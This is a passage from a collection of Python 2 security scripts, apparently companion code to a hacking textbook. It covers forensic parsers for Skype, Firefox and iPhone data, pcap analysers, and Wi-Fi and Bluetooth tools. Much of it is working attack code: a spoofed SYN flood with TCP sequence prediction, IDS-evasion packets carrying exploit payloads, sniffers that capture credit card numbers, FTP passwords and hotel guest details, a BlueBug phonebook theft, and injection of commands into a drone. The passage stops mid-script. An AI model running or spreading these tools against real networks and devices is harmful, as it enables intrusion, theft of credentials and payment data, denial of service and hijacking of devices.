    print '\n[*] -- Found Calls --'

    for row in c:
        print '[+] Time: '+str(row[0])+\
          ' | Partner: '+ str(row[1])


def printMessages(skypeDB):
    conn = sqlite3.connect(skypeDB)
    c = conn.cursor()
    c.execute("SELECT datetime(timestamp,'unixepoch'), \
              dialog_partner, author, body_xml FROM Messages;")
    print '\n[*] -- Found Messages --'

    for row in c:
        try:
            if 'partlist' not in str(row[3]):
                if str(row[1]) != str(row[2]):
                    msgDirection = 'To ' + str(row[1]) + ': '
                else:
                    msgDirection = 'From ' + str(row[2]) + ' : '
                print 'Time: ' + str(row[0]) + ' ' \
                    + msgDirection + str(row[3])
        except:
            pass


def main():
    parser = optparse.OptionParser("usage %prog "+\
      "-p <skype profile path> ")
    parser.add_option('-p', dest='pathName', type='string',\
      help='specify skype profile path')

    (options, args) = parser.parse_args()
    pathName = options.pathName
    if pathName == None:
        print parser.usage
        exit(0)
    elif os.path.isdir(pathName) == False:
        print '[!] Path Does Not Exist: ' + pathName
        exit(0)
    else:
        skypeDB = os.path.join(pathName, 'main.db')
        if os.path.isfile(skypeDB):
            printProfile(skypeDB)
            printContacts(skypeDB)
            printCallLog(skypeDB)
            printMessages(skypeDB)
        else:
            print '[!] Skype Database '+\
              'does not exist: ' + skpeDB


if __name__ == '__main__':
    main()

########NEW FILE########
__FILENAME__ = 6-firefoxParse
#!/usr/bin/python
# -*- coding: utf-8 -*-

import re
import optparse
import os
import sqlite3


def printDownloads(downloadDB):
    conn = sqlite3.connect(downloadDB)
    c = conn.cursor()
    c.execute('SELECT name, source, datetime(endTime/1000000,\
    \'unixepoch\') FROM moz_downloads;'
              )
    print '\n[*] --- Files Downloaded --- '
    for row in c:
        print '[+] File: ' + str(row[0]) + ' from source: ' \
            + str(row[1]) + ' at: ' + str(row[2])


def printCookies(cookiesDB):
    try:
        conn = sqlite3.connect(cookiesDB)
        c = conn.cursor()
        c.execute('SELECT host, name, value FROM moz_cookies')

        print '\n[*] -- Found Cookies --'
        for row in c:
            host = str(row[0])
            name = str(row[1])
            value = str(row[2])
            print '[+] Host: ' + host + ', Cookie: ' + name \
                + ', Value: ' + value
    except Exception, e:
        if 'encrypted' in str(e):
            print '\n[*] Error reading your cookies database.'
            print '[*] Upgrade your Python-Sqlite3 Library'


def printHistory(placesDB):
    try:
        conn = sqlite3.connect(placesDB)
        c = conn.cursor()
        c.execute("select url, datetime(visit_date/1000000, \
          'unixepoch') from moz_places, moz_historyvisits \
          where visit_count > 0 and moz_places.id==\
          moz_historyvisits.place_id;")

        print '\n[*] -- Found History --'
        for row in c:
            url = str(row[0])
            date = str(row[1])
            print '[+] ' + date + ' - Visited: ' + url
    except Exception, e:
        if 'encrypted' in str(e):
            print '\n[*] Error reading your places database.'
            print '[*] Upgrade your Python-Sqlite3 Library'
            exit(0)


def printGoogle(placesDB):
    conn = sqlite3.connect(placesDB)
    c = conn.cursor()
    c.execute("select url, datetime(visit_date/1000000, \
      'unixepoch') from moz_places, moz_historyvisits \
      where visit_count > 0 and moz_places.id==\
      moz_historyvisits.place_id;")

    print '\n[*] -- Found Google --'
    for row in c:
        url = str(row[0])
        date = str(row[1])
        if 'google' in url.lower():
            r = re.findall(r'q=.*\&', url)
            if r:
                search=r[0].split('&')[0]
                search=search.replace('q=', '').replace('+', ' ')
                print '[+] '+date+' - Searched For: ' + search


def main():
    parser = optparse.OptionParser("usage %prog "+\
      "-p <firefox profile path> "
                              )
    parser.add_option('-p', dest='pathName', type='string',\
      help='specify skype profile path')

    (options, args) = parser.parse_args()
    pathName = options.pathName
    if pathName == None:
        print parser.usage
        exit(0)
    elif os.path.isdir(pathName) == False:
        print '[!] Path Does Not Exist: ' + pathName
        exit(0)
    else:

        downloadDB = os.path.join(pathName, 'downloads.sqlite')
        if os.path.isfile(downloadDB):
            printDownloads(downloadDB)
        else:
            print '[!] Downloads Db does not exist: '+downloadDB

        cookiesDB = os.path.join(pathName, 'cookies.sqlite')
        if os.path.isfile(cookiesDB):
            pass
            printCookies(cookiesDB)
        else:
            print '[!] Cookies Db does not exist:' + cookiesDB

        placesDB = os.path.join(pathName, 'places.sqlite')
        if os.path.isfile(placesDB):
            printHistory(placesDB)
            printGoogle(placesDB)
        else:
            print '[!] PlacesDb does not exist: ' + placesDB


if __name__ == '__main__':
    main()


########NEW FILE########
__FILENAME__ = 7-iphoneMessages
#!/usr/bin/python
# -*- coding: utf-8 -*-
import os
import sqlite3
import optparse


def isMessageTable(iphoneDB):
    try:
        conn = sqlite3.connect(iphoneDB)
        c = conn.cursor()
        c.execute('SELECT tbl_name FROM sqlite_master \
          WHERE type==\"table\";')
        for row in c:
            if 'message' in str(row):
                return True
    except:
        return False


def printMessage(msgDB):
    try:
        conn = sqlite3.connect(msgDB)
        c = conn.cursor()
        c.execute('select datetime(date,\'unixepoch\'),\
          address, text from message WHERE address>0;')
        for row in c:
            date = str(row[0])
            addr = str(row[1])
            text = row[2]
            print '\n[+] Date: '+date+', Addr: '+addr \
                + ' Message: ' + text
    except:
        pass


def main():
    parser = optparse.OptionParser("usage %prog "+\
      "-p <iPhone Backup Directory> ")
    parser.add_option('-p', dest='pathName',\
      type='string',help='specify skype profile path')
    (options, args) = parser.parse_args()
    
    pathName = options.pathName
    if pathName == None:
        print parser.usage
        exit(0)
    else:
        dirList = os.listdir(pathName)
        for fileName in dirList:
            iphoneDB = os.path.join(pathName, fileName)
            if isMessageTable(iphoneDB):
                try:
                    print '\n[*] --- Found Messages ---'
                    printMessage(iphoneDB)
                except:
                    pass


if __name__ == '__main__':
    main()

########NEW FILE########
__FILENAME__ = 1-geoIP
#!/usr/bin/python
# -*- coding: utf-8 -*-
import pygeoip
gi = pygeoip.GeoIP('/opt/GeoIP/Geo.dat')


def printRecord(tgt):
    rec = gi.record_by_name(tgt)
    city = rec['city']
    region = rec['region_name']
    country = rec['country_name']
    long = rec['longitude']
    lat = rec['latitude']
    print '[*] Target: ' + tgt + ' Geo-located. '
    print '[+] '+str(city)+', '+str(region)+', '+str(country)
    print '[+] Latitude: '+str(lat)+ ', Longitude: '+ str(long)


tgt = '173.255.226.98'
printRecord(tgt)


########NEW FILE########
__FILENAME__ = 10-idsFoil
import optparse
from scapy.all import *
from random import randint


def ddosTest(src, dst, iface, count):
    pkt=IP(src=src,dst=dst)/ICMP(type=8,id=678)/Raw(load='1234')
    send(pkt, iface=iface, count=count)
    
    pkt = IP(src=src,dst=dst)/ICMP(type=0)/Raw(load='AAAAAAAAAA')
    send(pkt, iface=iface, count=count)
    
    pkt = IP(src=src,dst=dst)/UDP(dport=31335)/Raw(load='PONG')
    send(pkt, iface=iface, count=count)
    
    pkt = IP(src=src,dst=dst)/ICMP(type=0,id=456)
    send(pkt, iface=iface, count=count)


def exploitTest(src, dst, iface, count):
    
    pkt = IP(src=src, dst=dst) / UDP(dport=518) \
    /Raw(load="\x01\x03\x00\x00\x00\x00\x00\x01\x00\x02\x02\xE8")
    send(pkt, iface=iface, count=count)
    
    pkt = IP(src=src, dst=dst) / UDP(dport=635) \
    /Raw(load="^\xB0\x02\x89\x06\xFE\xC8\x89F\x04\xB0\x06\x89F")
    send(pkt, iface=iface, count=count)


def scanTest(src, dst, iface, count):
    pkt = IP(src=src, dst=dst) / UDP(dport=7) \
      /Raw(load='cybercop')
    send(pkt)

    pkt = IP(src=src, dst=dst) / UDP(dport=10080) \
      /Raw(load='Amanda')
    send(pkt, iface=iface, count=count)


def main():
    parser = optparse.OptionParser('usage %prog '+\
      '-i <iface> -s <src> -t <target> -c <count>'
                              )
    parser.add_option('-i', dest='iface', type='string',\
      help='specify network interface')
    parser.add_option('-s', dest='src', type='string',\
      help='specify source address')
    parser.add_option('-t', dest='tgt', type='string',\
      help='specify target address')
    parser.add_option('-c', dest='count', type='int',\
      help='specify packet count')

    (options, args) = parser.parse_args()
    if options.iface == None:
        iface = 'eth0'
    else:
        iface = options.iface
    if options.src == None:
        src = '.'.join([str(randint(1,254)) for x in range(4)])
    else:
        src = options.src
    if options.tgt == None:
        print parser.usage
        exit(0)
    else:
        dst = options.tgt
    if options.count == None:
        count = 1
    else:
        count = options.count

    ddosTest(src, dst, iface, count)
    exploitTest(src, dst, iface, count)
    scanTest(src, dst, iface, count)


if __name__ == '__main__':
    main()


########NEW FILE########
__FILENAME__ = 2-printDirection
#!/usr/bin/python
# -*- coding: utf-8 -*-
import dpkt
import socket


def printPcap(pcap):
    for (ts, buf) in pcap:
        try:
            eth = dpkt.ethernet.Ethernet(buf)
            ip = eth.data
            src = socket.inet_ntoa(ip.src)
            dst = socket.inet_ntoa(ip.dst)
            print '[+] Src: ' + src + ' --> Dst: ' + dst
        except:
            pass


def main():
    f = open('geotest.pcap')
    pcap = dpkt.pcap.Reader(f)
    printPcap(pcap)


if __name__ == '__main__':
    main()


########NEW FILE########
__FILENAME__ = 3-geoPrint
#!/usr/bin/python
# -*- coding: utf-8 -*-
import dpkt
import socket
import pygeoip
import optparse
gi = pygeoip.GeoIP('/opt/GeoIP/Geo.dat')


def retGeoStr(ip):
    try:
        rec = gi.record_by_name(ip)
        city = rec['city']
        country = rec['country_code3']
        if city != '':
            geoLoc = city + ', ' + country
        else:
            geoLoc = country
        return geoLoc
    except Exception, e:
        return 'Unregistered'


def printPcap(pcap):
    for (ts, buf) in pcap:
        try:
            eth = dpkt.ethernet.Ethernet(buf)
            ip = eth.data
            src = socket.inet_ntoa(ip.src)
            dst = socket.inet_ntoa(ip.dst)
            print '[+] Src: ' + src + ' --> Dst: ' + dst
            print '[+] Src: ' + retGeoStr(src) + '--> Dst: ' \
              + retGeoStr(dst)
        except:
            pass


def main():
    parser = optparse.OptionParser('usage %prog -p <pcap file>')
    parser.add_option('-p', dest='pcapFile', type='string',\
      help='specify pcap filename')
    (options, args) = parser.parse_args()
    if options.pcapFile == None:
        print parser.usage
        exit(0)
    pcapFile = options.pcapFile
    f = open(pcapFile)
    pcap = dpkt.pcap.Reader(f)
    printPcap(pcap)


if __name__ == '__main__':
    main()


########NEW FILE########
__FILENAME__ = 4-googleEarthPcap
#!/usr/bin/python
# -*- coding: utf-8 -*-
import dpkt
import socket
import pygeoip
import optparse
gi = pygeoip.GeoIP('/opt/GeoIP/Geo.dat')


def retKML(ip):
    rec = gi.record_by_name(ip)
    try:
        longitude = rec['longitude']
        latitude = rec['latitude']
        kml = (
               '<Placemark>\n'
               '<name>%s</name>\n'
               '<Point>\n'
               '<coordinates>%6f,%6f</coordinates>\n'
               '</Point>\n'
               '</Placemark>\n'
               ) %(ip,longitude, latitude)
        return kml
    except:
        return ''


def plotIPs(pcap):
    kmlPts = ''
    for (ts, buf) in pcap:
        try:
            eth = dpkt.ethernet.Ethernet(buf)
            ip = eth.data
            src = socket.inet_ntoa(ip.src)
            srcKML = retKML(src)
            dst = socket.inet_ntoa(ip.dst)
            dstKML = retKML(dst)
            kmlPts = kmlPts + srcKML + dstKML
        except:
            pass
    return kmlPts


def main():
    parser = optparse.OptionParser('usage %prog -p <pcap file>')
    parser.add_option('-p', dest='pcapFile', type='string',\
      help='specify pcap filename')
    (options, args) = parser.parse_args()
    if options.pcapFile == None:
        print parser.usage
        exit(0)
    pcapFile = options.pcapFile
    f = open(pcapFile)
    pcap = dpkt.pcap.Reader(f)

    kmlheader = '<?xml version="1.0" encoding="UTF-8"?>\
    \n<kml xmlns="http://www.opengis.net/kml/2.2">\n<Document>\n'
    kmlfooter = '</Document>\n</kml>\n'
    kmldoc=kmlheader+plotIPs(pcap)+kmlfooter
    print kmldoc


if __name__ == '__main__':
    main()


########NEW FILE########
__FILENAME__ = 5-findDDoS
#!/usr/bin/python
# -*- coding: utf-8 -*-
import dpkt
import optparse
import socket
THRESH = 1000


def findDownload(pcap):
    for (ts, buf) in pcap:
        try:
            eth = dpkt.ethernet.Ethernet(buf)
            ip = eth.data
            src = socket.inet_ntoa(ip.src)
            tcp = ip.data
            http = dpkt.http.Request(tcp.data)
            if http.method == 'GET':
                uri = http.uri.lower()
                if '.zip' in uri and 'loic' in uri:
                    print '[!] ' + src + ' Downloaded LOIC.'
        except:
            pass


def findHivemind(pcap):
    for (ts, buf) in pcap:
        try:
            eth = dpkt.ethernet.Ethernet(buf)
            ip = eth.data
            src = socket.inet_ntoa(ip.src)
            dst = socket.inet_ntoa(ip.dst)
            tcp = ip.data
            dport = tcp.dport
            sport = tcp.sport
            if dport == 6667:
                if '!lazor' in tcp.data.lower():
                    print '[!] DDoS Hivemind issued by: '+src
                    print '[+] Target CMD: ' + tcp.data
            if sport == 6667:
                if '!lazor' in tcp.data.lower():
                    print '[!] DDoS Hivemind issued to: '+src
                    print '[+] Target CMD: ' + tcp.data
        except:
            pass


def findAttack(pcap):
    pktCount = {}
    for (ts, buf) in pcap:
        try:
            eth = dpkt.ethernet.Ethernet(buf)
            ip = eth.data
            src = socket.inet_ntoa(ip.src)
            dst = socket.inet_ntoa(ip.dst)
            tcp = ip.data
            dport = tcp.dport
            if dport == 80:
                stream = src + ':' + dst
                if pktCount.has_key(stream):
                    pktCount[stream] = pktCount[stream] + 1
                else:
                    pktCount[stream] = 1
        except:
            pass

    for stream in pktCount:
        pktsSent = pktCount[stream]
        if pktsSent > THRESH:
            src = stream.split(':')[0]
            dst = stream.split(':')[1]
            print '[+] '+src+' attacked '+dst+' with ' \
                + str(pktsSent) + ' pkts.'


def main():
    parser = optparse.OptionParser("usage %prog '+\
      '-p <pcap file> -t <thresh>"
                              )
    parser.add_option('-p', dest='pcapFile', type='string',\
      help='specify pcap filename')
    parser.add_option('-t', dest='thresh', type='int',\
      help='specify threshold count ')

    (options, args) = parser.parse_args()
    if options.pcapFile == None:
        print parser.usage
        exit(0)
    if options.thresh != None:
        THRESH = options.thresh
    pcapFile = options.pcapFile
    f = open(pcapFile)
    pcap = dpkt.pcap.Reader(f)
    findDownload(pcap)
    findHivemind(pcap)
    findAttack(pcap)


if __name__ == '__main__':
    main()

########NEW FILE########
__FILENAME__ = 6-spoofDetect
#!/usr/bin/python
# -*- coding: utf-8 -*-
import time
import optparse
from scapy.all import *
from IPy import IP as IPTEST

ttlValues = {}
THRESH = 5


def checkTTL(ipsrc, ttl):
    if IPTEST(ipsrc).iptype() == 'PRIVATE':
        return

    if not ttlValues.has_key(ipsrc):
        pkt = sr1(IP(dst=ipsrc) / ICMP(), \
          retry=0, timeout=1, verbose=0)
        ttlValues[ipsrc] = pkt.ttl

    if abs(int(ttl) - int(ttlValues[ipsrc])) > THRESH:
        print '\n[!] Detected Possible Spoofed Packet From: '\
          + ipsrc
        print '[!] TTL: ' + ttl + ', Actual TTL: ' \
            + str(ttlValues[ipsrc])


def testTTL(pkt):
    try:
        if pkt.haslayer(IP):
            ipsrc = pkt.getlayer(IP).src
            ttl = str(pkt.ttl)
            checkTTL(ipsrc, ttl)
    except:

        pass


def main():
    parser = optparse.OptionParser("usage %prog "+\
      "-i <interface> -t <thresh>")
    parser.add_option('-i', dest='iface', type='string',\
      help='specify network interface')
    parser.add_option('-t', dest='thresh', type='int',
      help='specify threshold count ')

    (options, args) = parser.parse_args()
    if options.iface == None:
        conf.iface = 'eth0'
    else:
        conf.iface = options.iface
    if options.thresh != None:
        THRESH = options.thresh
    else:
        THRESH = 5

    sniff(prn=testTTL, store=0)


if __name__ == '__main__':
    main()

########NEW FILE########
__FILENAME__ = 7-testFastFlux
#!/usr/bin/python
# -*- coding: utf-8 -*-
from scapy.all import *

dnsRecords = {}

def handlePkt(pkt):
    if pkt.haslayer(DNSRR):
        rrname = pkt.getlayer(DNSRR).rrname
        rdata = pkt.getlayer(DNSRR).rdata
        if dnsRecords.has_key(rrname):
            if rdata not in dnsRecords[rrname]:
                dnsRecords[rrname].append(rdata)
        else:
            dnsRecords[rrname] = []
            dnsRecords[rrname].append(rdata)


def main():
    pkts = rdpcap('fastFlux.pcap')
    for pkt in pkts:  
        handlePkt(pkt)
    
    for item in dnsRecords:
        print '[+] '+item+' has '+str(len(dnsRecords[item])) \
            + ' unique IPs.'


if __name__ == '__main__':
    main()

########NEW FILE########
__FILENAME__ = 8-testDomainFlux
#!/usr/bin/python
# -*- coding: utf-8 -*-
from scapy.all import *


def dnsQRTest(pkt):
    if pkt.haslayer(DNSRR) and pkt.getlayer(UDP).sport == 53:
        rcode = pkt.getlayer(DNS).rcode
        qname = pkt.getlayer(DNSQR).qname
        if rcode == 3:
            print '[!] Name request lookup failed: ' + qname
            return True
        else:
            return False


def main():
    unAnsReqs = 0
    pkts = rdpcap('domainFlux.pcap')
    for pkt in pkts:
        if dnsQRTest(pkt):
            unAnsReqs = unAnsReqs + 1
    print '[!] '+str(unAnsReqs)+' Total Unanswered Name Requests'


if __name__ == '__main__':
    main()

########NEW FILE########
__FILENAME__ = 9-mitnickAttack
import optparse
from scapy.all import *


def synFlood(src, tgt):
    for sport in range(1024,65535):
        IPlayer = IP(src=src, dst=tgt)
        TCPlayer = TCP(sport=sport, dport=513)
        pkt = IPlayer / TCPlayer
        send(pkt)


def calTSN(tgt):
    seqNum = 0
    preNum = 0
    diffSeq = 0

    for x in range(1, 5):
        if preNum != 0:
            preNum = seqNum
        pkt = IP(dst=tgt) / TCP()
        ans = sr1(pkt, verbose=0)
        seqNum = ans.getlayer(TCP).seq
        diffSeq = seqNum - preNum
        print '[+] TCP Seq Difference: ' + str(diffSeq)
    return seqNum + diffSeq


def spoofConn(src, tgt, ack):
    IPlayer = IP(src=src, dst=tgt)
    TCPlayer = TCP(sport=513, dport=514)
    synPkt = IPlayer / TCPlayer
    send(synPkt)

    IPlayer = IP(src=src, dst=tgt)
    TCPlayer = TCP(sport=513, dport=514, ack=ack)
    ackPkt = IPlayer / TCPlayer
    send(ackPkt)


def main():
    parser = optparse.OptionParser('usage %prog '+\
      '-s <src for SYN Flood> -S <src for spoofed connection> '+\
      '-t <target address>')
    parser.add_option('-s', dest='synSpoof', type='string',\
      help='specifc src for SYN Flood')
    parser.add_option('-S', dest='srcSpoof', type='string',\
      help='specify src for spoofed connection')
    parser.add_option('-t', dest='tgt', type='string',\
      help='specify target address')
    (options, args) = parser.parse_args()

    if options.synSpoof == None or options.srcSpoof == None \
        or options.tgt == None:
        print parser.usage
        exit(0)
    else:
        synSpoof = options.synSpoof
        srcSpoof = options.srcSpoof
        tgt = options.tgt

    print '[+] Starting SYN Flood to suppress remote server.'
    synFlood(synSpoof, srcSpoof)
    print '[+] Calculating correct TCP Sequence Number.'
    seqNum = calTSN(tgt) + 1
    print '[+] Spoofing Connection.'
    spoofConn(srcSpoof, tgt, seqNum)
    print '[+] Done.'


if __name__ == '__main__':
    main()

########NEW FILE########
__FILENAME__ = 1-testSniff
#!/usr/bin/python
# -*- coding: utf-8 -*-

from scapy.all import *


def pktPrint(pkt):
    if pkt.haslayer(Dot11Beacon):
        print '[+] Detected 802.11 Beacon Frame'
    elif pkt.haslayer(Dot11ProbeReq):
        print '[+] Detected 802.11 Probe Request Frame'
    elif pkt.haslayer(TCP):
        print '[+] Detected a TCP Packet'
    elif pkt.haslayer(DNS):
        print '[+] Detected a DNS Packet'


conf.iface = 'mon0'
sniff(prn=pktPrint)

########NEW FILE########
__FILENAME__ = 10-iphoneFinder
#!/usr/bin/python
# -*- coding: utf-8 -*-

from scapy.all import *
from bluetooth import *


def retBtAddr(addr):
    btAddr=str(hex(int(addr.replace(':', ''), 16) + 1))[2:]
    btAddr=btAddr[0:2]+":"+btAddr[2:4]+":"+btAddr[4:6]+":"+\
    btAddr[6:8]+":"+btAddr[8:10]+":"+btAddr[10:12]
    return btAddr

def checkBluetooth(btAddr):
    btName = lookup_name(btAddr)
    if btName:
        print '[+] Detected Bluetooth Device: ' + btName
    else:
        print '[-] Failed to Detect Bluetooth Device.'


def wifiPrint(pkt):
    iPhone_OUI = 'd0:23:db'
    if pkt.haslayer(Dot11):
        wifiMAC = pkt.getlayer(Dot11).addr2
        if iPhone_OUI == wifiMAC[:8]:
            print '[*] Detected iPhone MAC: ' + wifiMAC
            btAddr = retBtAddr(wifiMAC)
            print '[+] Testing Bluetooth MAC: ' + btAddr
            checkBluetooth(btAddr)


conf.iface = 'mon0'
sniff(prn=wifiPrint)

########NEW FILE########
__FILENAME__ = 11-rfcommScan
#!/usr/bin/python
# -*- coding: utf-8 -*-

from bluetooth import *


def rfcommCon(addr, port):
    sock = BluetoothSocket(RFCOMM)
    try:
        sock.connect((addr, port))
        print '[+] RFCOMM Port ' + str(port) + ' open'
        sock.close()
    except Exception, e:
        print '[-] RFCOMM Port ' + str(port) + ' closed'


for port in range(1, 30):
    rfcommCon('00:16:38:DE:AD:11', port)

########NEW FILE########
__FILENAME__ = 12-sdpScan
#!/usr/bin/python
# -*- coding: utf-8 -*-
from bluetooth import *


def sdpBrowse(addr):
    services = find_service(address=addr)
    for service in services:
        name = service['name']
        proto = service['protocol']
        port = str(service['port'])
        print '[+] Found ' + str(name) + ' on ' + str(proto) + ':' + port


sdpBrowse('00:16:38:DE:AD:11')

########NEW FILE########
__FILENAME__ = 13-ninjaPrint
#!/usr/bin/python
# -*- coding: utf-8 -*-

import obexftp

try:
    btPrinter = obexftp.client(obexftp.BLUETOOTH)
    btPrinter.connect('00:16:38:DE:AD:11', 2)
    btPrinter.put_file('/tmp/ninja.jpg')
    print '[+] Printed Ninja Image.'
except:

    print '[-] Failed to print Ninja Image.'

########NEW FILE########
__FILENAME__ = 14-blueBug
#!/usr/bin/python
# -*- coding: utf-8 -*-
import bluetooth

tgtPhone = 'AA:BB:CC:DD:EE:FF'

port = 17

phoneSock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
phoneSock.connect((tgtPhone, port))

for contact in range(1, 5):
    atCmd = 'AT+CPBR=' + str(contact) + '\n'
    phoneSock.send(atCmd)
    result = client_sock.recv(1024)
    print '[+] ' + str(contact) + ' : ' + result

sock.close()

########NEW FILE########
__FILENAME__ = 2-creditSniff
#!/usr/bin/python
# -*- coding: utf-8 -*-
import re
import optparse
from scapy.all import *


def findCreditCard(pkt):
    raw = pkt.sprintf('%Raw.load%')
    americaRE = re.findall('3[47][0-9]{13}', raw)
    masterRE = re.findall('5[1-5][0-9]{14}', raw)
    visaRE = re.findall('4[0-9]{12}(?:[0-9]{3})?', raw)

    if americaRE:
        print '[+] Found American Express Card: ' + americaRE[0]
    if masterRE:
        print '[+] Found MasterCard Card: ' + masterRE[0]
    if visaRE:
        print '[+] Found Visa Card: ' + visaRE[0]


def main():
    parser = optparse.OptionParser('usage %prog -i <interface>')
    parser.add_option('-i', dest='interface', type='string',\
      help='specify interface to listen on')
    (options, args) = parser.parse_args()

    if options.interface == None:
        print parser.usage
        exit(0)
    else:
        conf.iface = options.interface

    try:
        print '[*] Starting Credit Card Sniffer.'
        sniff(filter='tcp', prn=findCreditCard, store=0)
    except KeyboardInterrupt:
        exit(0)


if __name__ == '__main__':
    main()

########NEW FILE########
__FILENAME__ = 3-hotelSniff
#!/usr/bin/python
# -*- coding: utf-8 -*-

import optparse
from scapy.all import *


def findGuest(pkt):
    raw = pkt.sprintf('%Raw.load%')
    name = re.findall('(?i)LAST_NAME=(.*)&', raw)
    room = re.findall("(?i)ROOM_NUMBER=(.*)'", raw)
    if name:
        print '[+] Found Hotel Guest ' + str(name[0])+\
          ', Room #' + str(room[0])


def main():
    parser = optparse.OptionParser('usage %prog '+\
      '-i <interface>')
    parser.add_option('-i', dest='interface',\
       type='string', help='specify interface to listen on')
    (options, args) = parser.parse_args()

    if options.interface == None:
        print parser.usage
        exit(0)
    else:
        conf.iface = options.interface

    try:
        print '[*] Starting Hotel Guest Sniffer.'
        sniff(filter='tcp', prn=findGuest, store=0)
    except KeyboardInterrupt:
        exit(0)


if __name__ == '__main__':
    main()

########NEW FILE########
__FILENAME__ = 4-googleSniff
#!/usr/bin/python
# -*- coding: utf-8 -*-
import optparse
from scapy.all import *


def findGoogle(pkt):
    if pkt.haslayer(Raw):
        payload = pkt.getlayer(Raw).load
        if 'GET' in payload:
            if 'google' in payload:
                r = re.findall(r'(?i)\&q=(.*?)\&', payload)
                if r:
                    search = r[0].split('&')[0]
                    search = search.replace('q=', '').\
                      replace('+', ' ').replace('%20', ' ')
                    print '[+] Searched For: ' + search


def main():
    parser = optparse.OptionParser('usage %prog -i '+\
      '<interface>')
    parser.add_option('-i', dest='interface', \
      type='string', help='specify interface to listen on')
    (options, args) = parser.parse_args()

    if options.interface == None:
        print parser.usage
        exit(0)
    else:
        conf.iface = options.interface

    try:
        print '[*] Starting Google Sniffer.'
        sniff(filter='tcp port 80', prn=findGoogle)
    except KeyboardInterrupt:
        exit(0)


if __name__ == '__main__':
    main()


########NEW FILE########
__FILENAME__ = 5-ftpSniff
#!/usr/bin/python
# -*- coding: utf-8 -*-

import optparse
from scapy.all import *


def ftpSniff(pkt):
    
    dest = pkt.getlayer(IP).dst
    raw = pkt.sprintf('%Raw.load%')
    user = re.findall('(?i)USER (.*)', raw)
    pswd = re.findall('(?i)PASS (.*)', raw)
    
    if user:
        print '[*] Detected FTP Login to ' + str(dest)
        print '[+] User account: ' + str(user[0])
    elif pswd:
        print '[+] Password: ' + str(pswd[0])


def main():
    parser = optparse.OptionParser('usage %prog '+\
                                   '-i <interface>')
    parser.add_option('-i', dest='interface', \
                      type='string', help='specify interface to listen on')
    (options, args) = parser.parse_args()
    
    if options.interface == None:
        print parser.usage
        exit(0)
    else:
        conf.iface = options.interface
    
    try:
        sniff(filter='tcp port 21', prn=ftpSniff)
    except KeyboardInterrupt:
        exit(0)


if __name__ == '__main__':
    main()



########NEW FILE########
__FILENAME__ = 6-sniffHidden
#!/usr/bin/python
# -*- coding: utf-8 -*-
import sys
from scapy.all import *

interface = 'mon0'

hiddenNets = []
unhiddenNets = []

def sniffDot11(p):
    
    if p.haslayer(Dot11ProbeResp):
        addr2 = p.getlayer(Dot11).addr2
        if (addr2 in hiddenNets) & (addr2 not in unhiddenNets):
            netName = p.getlayer(Dot11ProbeResp).info
            print '[+] Decloaked Hidden SSID : ' +\
                netName + ' for MAC: ' + addr2
            unhiddenNets.append(addr2)
    
    if p.haslayer(Dot11Beacon):
        if p.getlayer(Dot11Beacon).info == '':
            addr2 = p.getlayer(Dot11).addr2
            if addr2 not in hiddenNets:
                print '[-] Detected Hidden SSID: ' +\
                    'with MAC:' + addr2
                hiddenNets.append(addr2)


sniff(iface=interface, prn=sniffDot11)


########NEW FILE########
__FILENAME__ = 6-sniffProbe
#!/usr/bin/python
# -*- coding: utf-8 -*-
from scapy.all import *

interface = 'mon0'
probeReqs = []


def sniffProbe(p):
    if p.haslayer(Dot11ProbeReq):
        netName = p.getlayer(Dot11ProbeReq).info
        if netName not in probeReqs:
            probeReqs.append(netName)
            print '[+] Detected New Probe Request: ' + netName


sniff(iface=interface, prn=sniffProbe)


########NEW FILE########
__FILENAME__ = 7-dup
from scapy.all import *
 
def dupRadio(pkt):
	rPkt=pkt.getlayer(RadioTap)
	version=rPkt.version
	pad=rPkt.pad
	present=rPkt.present
	notdecoded=rPkt.notdecoded
	nPkt = RadioTap(version=version,pad=pad,present=present,notdecoded=notdecoded)
	return nPkt

def dupDot11(pkt):
	dPkt=pkt.getlayer(Dot11)
	subtype=dPkt.subtype
	Type=dPkt.type
	proto=dPkt.proto
	FCfield=dPkt.FCfield
	ID=dPkt.ID
	addr1=dPkt.addr1
	addr2=dPkt.addr2
	addr3=dPkt.addr3
	SC=dPkt.SC 
	addr4=dPkt.addr4
	nPkt=Dot11(subtype=subtype,type=Type,proto=proto,FCfield=FCfield,ID=ID,addr1=addr1,addr2=addr2,addr3=addr3,SC=SC,addr4=addr4)
	return nPkt

def dupSNAP(pkt):
	sPkt=pkt.getlayer(SNAP)
	oui=sPkt.OUI
	code=sPkt.code
	nPkt=SNAP(OUI=oui,code=code)
	return nPkt
 
def dupLLC(pkt):
	lPkt=pkt.getlayer(LLC)
	dsap=lPkt.dsap
	ssap=lPkt.ssap
	ctrl=lPkt.ctrl
	nPkt=LLC(dsap=dsap,ssap=ssap,ctrl=ctrl)
	return nPkt
 
def dupIP(pkt):
	iPkt=pkt.getlayer(IP)
	version=iPkt.version
	tos=iPkt.tos
	ID=iPkt.id 
	flags=iPkt.flags
	ttl=iPkt.ttl
	proto=iPkt.proto
	src=iPkt.src
	dst=iPkt.dst
	options=iPkt.options
	nPkt=IP(version=version,id=ID,tos=tos,flags=flags,ttl=ttl,proto=proto,src=src,dst=dst,options=options)
	return nPkt
 
def dupUDP(pkt):
	uPkt=pkt.getlayer(UDP)
	sport=uPkt.sport
	dport=uPkt.dport
	nPkt=UDP(sport=sport,dport=dport)
	return nPkt


########NEW FILE########
__FILENAME__ = 7-uavSniff
#!/usr/bin/python
# -*- coding: utf-8 -*-
import threading
import dup
from scapy.all import *

conf.iface = 'mon0'
NAVPORT = 5556
LAND = '290717696'
EMER = '290717952'
TAKEOFF = '290718208'


class interceptThread(threading.Thread):

    def __init__(self):
        threading.Thread.__init__(self)
        self.curPkt = None
        self.seq = 0
        self.foundUAV = False

    def run(self):
        sniff(prn=self.interceptPkt, filter='udp port 5556')

    def interceptPkt(self, pkt):
        if self.foundUAV == False:
            print '[*] UAV Found.'
            self.foundUAV = True
        self.curPkt = pkt
        raw = pkt.sprintf('%Raw.load%')
        try:
            self.seq = int(raw.split(',')[0].split('=')[-1]) + 5
	except:
	    self.seq = 0
	
    def injectCmd(self, cmd):
        radio = dup.dupRadio(self.curPkt)
        dot11 = dup.dupDot11(self.curPkt)
        snap = dup.dupSNAP(self.curPkt)
        llc = dup.dupLLC(self.curPkt)
        ip = dup.dupIP(self.curPkt)
        udp = dup.dupUDP(self.curPkt)
        raw = Raw(load=cmd)
        injectPkt = radio / dot11 / llc / snap / ip / udp / raw
        sendp(injectPkt)

    def emergencyland(self):
        spoofSeq = self.seq + 100
